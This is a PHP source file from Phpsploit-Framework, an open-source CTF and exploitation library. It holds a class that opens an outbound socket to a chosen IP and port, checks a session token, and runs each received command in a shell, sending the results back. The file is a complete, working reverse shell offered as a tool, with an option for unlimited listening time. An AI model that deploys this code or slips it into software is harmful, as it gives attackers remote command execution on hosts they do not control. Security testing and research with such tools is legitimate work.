<?php
/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:03
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_SocketShell extends Class_Operate
{
    const EXCEPTION_MESSAGE_TOKEN_ERROR  = "token is error";
    const EXCEPTION_MESSAGE_CONNECT_QUIT = "connect is exit";
    const EXCEPTION_MESSAGE_CONNECT_EXIT = "connect service is exit";
    const EXCEPTION_BREAK                = 1;

    private static $_socket             = null;
    private static $_max_connect_number = 0;

    public static function start ( $ip , $port , $max_connect_number = 1 , $max_execute_time = 3600 , $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        try {
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nShell Server is Start , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient manager connect : " . $_SERVER[ "REMOTE_ADDR" ] . ":" . $_SERVER[ "REMOTE_PORT" ] . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "Shell Server is Start" );
            }
            self::create_token ( $connect_domain_List_id );
            Class_Base_Socket::init ( $max_execute_time );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\n" . 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) );
            }
            self::$_max_connect_number = $max_connect_number;
            self::$_socket             = Class_Base_Socket::create ();
            Class_Base_Socket::connect ( self::$_socket , $ip , $port );
            $token = self::get_token ();
            self::check_browser_service_stop ();
            $_clientinfo = Class_Base_Socket::getpeername ( self::$_socket );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\ncreate socket connection to server : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "create socket connection to server : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) );
            }
            while ( true ) {
                self::check_browser_service_stop ();
                $command = Class_Base_Socket::read ( self::$_socket , ( 1024 * 1024 * 100 ) , PHP_BINARY_READ );
                if ( ! empty( $command ) ) {
                    $command      = str_replace ( "\n" , "" , str_replace ( "\r" , "" , $command ) );
                    $request_info = explode ( " " , $command );
                    if ( count ( $request_info ) < 2 ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                    }
                    $request_token = $request_info[ 0 ];
                    array_shift ( $request_info );
                    $command = implode ( " " , $request_info );
                    if ( $request_token != $token ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_TOKEN_ERROR , self::EXCEPTION_BREAK );
                    }
                    if ( $command == "quit" ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_QUIT , self::EXCEPTION_BREAK );
                    }
                    if ( $command == "exit" ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                    }
                    if ( $command == chr ( 3 ) ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                    }
                    $_output        = Class_Base_Shell::command ( $command );
                    $_socket_output = self::array_split_to_string ( $_output );
                    Class_Base_Socket::write ( self::$_socket , $_socket_output , null );
                    if ( ! is_cli () ) {
                        $_web_output = self::array_to_js_inner_html_string ( $_output );
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nserver : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . " , command : " . $command . " , result : " . "\n\n" . $_web_output ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        $_cli_output = $_socket_output;
                        Class_Base_Response::outputln ( "server : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . " , command : " . $command . " , result : \n\n" . $_cli_output );
                    }
                }
                self::check_browser_service_stop ();
            }
        } catch ( \Exception $e ) {
            try {
                Class_Base_Socket::close ( self::$_socket );
            } catch ( \Exception $e ) {
            }
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nShell Server is Stop , server ip ( " . $_clientinfo[ "ip" ] . " ) , server port ( " . $_clientinfo[ "port" ] . " ) time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( "\nShell Server is Stop , server ip ( " . $_clientinfo[ "ip" ] . " ) , server port ( " . $_clientinfo[ "port" ] . " ) time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) );
            }
            if ( $e->getMessage () != self::EXCEPTION_MESSAGE_CONNECT_EXIT ) {
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nexception message : " . $e->getMessage () . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( ( "\nexception message : " . $e->getMessage () . "\n" ) );
                }
            }
        }
    }

    public static function array_to_js_inner_html_string ( $array = array () )
    {
        return implode ( "\n" , $array ) . "\n";
    }

    public static function array_split_to_string ( $array = array () )
    {
        return implode ( "\n" , $array ) . "\n";
    }

    public static function check_browser_service_stop ()
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
            Class_Base_Response::outputln ( "" );
            flush ();
            if ( connection_aborted () ) {
                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
            }
        }
    }

    public static function create_token ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_SESSION[ "SOCKET_SHELL_TOKEN" ] = md5 ( time () . rand ( 10000000 , 99999999 ) );
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "socket connect authentication token : " . $_SESSION[ "SOCKET_SHELL_TOKEN" ] ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . "token : " . $_SESSION[ "SOCKET_SHELL_TOKEN" ] . "\n" );
        }
    }

    public static function get_token ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( empty( $_SESSION[ "SOCKET_SHELL_TOKEN" ] ) ) {
            return null;
        }
        return $_SESSION[ "SOCKET_SHELL_TOKEN" ];
    }

    public static function out_token ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "socket connect authentication token : " . ( empty( self::get_token () ) ? "" : self::get_token () ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . "socket connect authentication token : " . ( empty( self::get_token () ) ? "" : self::get_token () ) . "\n" );
        }
    }

}